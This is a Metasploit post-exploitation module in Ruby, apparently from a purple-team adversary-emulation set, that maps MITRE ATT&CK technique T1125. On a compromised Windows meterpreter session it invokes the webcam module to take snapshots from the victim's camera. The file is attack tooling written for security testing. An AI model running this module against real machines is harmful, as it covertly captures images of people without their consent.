##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post
  def initialize(info={})
    super(update_info(info,
                      'Name'          => 'Video Capture (T1125) Windows - Purple Team',
                      'Description'   => %q{
                        Collection:
                        An adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files.},
                      'License'       => MSF_LICENSE,
                      'Author'        => [ 'Praetorian' ],
                      'References'    => [ [ 'URL', 'https://attack.mitre.org/wiki/Technique/T1125' ] ],
                      'Platform'      => [ 'win' ],
                      'SessionTypes'  => [ 'meterpreter' ]
                     ))
    register_options(
    [
      OptString.new("MODULE", [ true, 'Module to execute', 'post/windows/manage/webcam']),
      OptInt.new('INDEX',   [false, 'The index of the webcam to use', 1]),
      OptInt.new('QUALITY', [false, 'The JPEG image quality', 50])
    ])
  end

  def run_module(mod)
      framework_mod = framework.modules.create(mod)
      framework_mod.datastore['SESSION'] = datastore['SESSION']
      framework_mod.datastore['VERBOSE'] = datastore['VERBOSE']
      framework_mod.datastore['ACTION'] = 'SNAPSHOT'
      framework_mod.datastore['INDEX'] = datastore['INDEX']
      framework_mod.datastore['QUALITY'] = datastore['QUALITY']
      framework_mod.datastore['WORKSPACE'] = datastore["WORKSPACE"] if datastore["WORKSPACE"]
      framework_mod.run_simple(
          'LocalInput' => self.user_input,
          'LocalOutput' => self.user_output,
          'RaiseExceptions' => true,
          'RunAsJob'  => false)
  end

  def run
    begin
      raise "Module requires meterpreter session" unless session.type == 'meterpreter'

      mod = datastore['MODULE']
      print_status("Executing '#{mod}' on #{session.inspect}")
      run_module(mod)

      print_good("Module T1125W execution successful.")

    rescue ::Exception => e
        print_error("#{e.class}: #{e.message}")
        print_error("Module T1125W execution failed.")
        return
    end
   end
end
